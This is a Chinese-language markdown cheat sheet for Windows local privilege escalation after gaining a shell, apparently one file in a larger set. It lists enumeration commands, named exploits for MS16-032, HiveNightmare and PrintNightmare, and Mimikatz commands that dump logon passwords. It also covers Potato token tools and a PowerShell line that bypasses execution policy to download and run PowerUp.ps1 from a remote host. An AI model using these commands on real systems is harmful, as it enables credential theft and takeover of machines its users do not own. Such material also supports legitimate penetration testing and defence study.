```
---

### 文档 3：提权_Windows本地提权速查表.md

```markdown
# Windows 本地提权速查表

## 常用命令（拿到 shell 后立即执行）

```powershell
# 当前用户权限
whoami /all

# 系统补丁信息
wmic qfe get Caption,Description,HotFixID,InstalledOn

# 已安装软件（寻找漏洞版本）
wmic product get name,version

# 未引用的服务路径
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\\Windows\\"

# 可写目录（重点：PATH 环境变量中的目录）
echo %PATH:;=&echo.%
```



## 经典提权漏洞与利用

| 漏洞编号                        | 影响系统                 | 利用工具              |
| :------------------------------ | :----------------------- | :-------------------- |
| MS16-032                        | Windows 7/8/10/2008/2012 | `Invoke-MS16-032.ps1` |
| CVE-2021-36934 (HiveNightmare)  | Windows 10/11            | `cve-2021-36934.exe`  |
| PrintNightmare (CVE-2021-34527) | Windows Server 2016/2019 | `PrintNightmare.py`   |

## 提权工具集

### Mimikatz（抓密码）

bash

```
privilege::debug
sekurlsa::logonpasswords
```



### Potato 系列（模拟令牌）

- **JuicyPotato**：适用于 Windows 2012/2016
- **SweetPotato**：跨 Windows 10/Server 2019

### PowerUp

powershell

```
powershell -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://.../PowerUp.ps1'); Invoke-AllChecks"
```



## 内核漏洞提权速查

1. 查看 `systeminfo` 获取补丁号
2. 使用 `windows-exploit-suggester.py` 或在线服务对比
3. 选择对应 exp 编译或下载预编译版本

## 服务与权限配置错误

- **AlwaysInstallElevated**：注册表键值 `HKLM\Software\Policies\Microsoft\Windows\Installer`
- **Unquoted Service Path**：服务路径包含空格且未加引号
- **可写服务二进制**：`sc qc 服务名` 查看 binPath，检查文件权限

**注意**：提权前先运行 `netstat -ano` 查看当前网络连接，避免断开。